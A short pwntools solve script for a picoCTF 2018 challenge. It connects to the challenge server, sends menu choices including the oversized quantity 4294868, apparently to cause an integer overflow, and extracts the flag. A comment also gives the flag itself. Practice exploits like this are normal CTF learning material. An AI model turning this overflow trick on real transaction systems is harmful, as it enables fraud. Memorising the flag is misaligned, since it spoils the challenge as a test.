# coding:utf-8
from pwn import *
import re

context.log_level = "error"
sh = remote("2018shell2.picoctf.com", 53220)
sh.recv()
sh.sendline('2')
sh.recv()
sh.sendline('1')
sh.recv()
sh.sendline('4294868')
sh.recv()
sh.sendline('2')
sh.recv()
sh.sendline('2')
sh.recv()
sh.sendline('1')
sh.recv()
msg = sh.recv()
flag = re.findall("(picoCTF{.*})", msg)[0]
print flag  # picoCTF{numb3r3_4r3nt_s4f3_cbb7151f}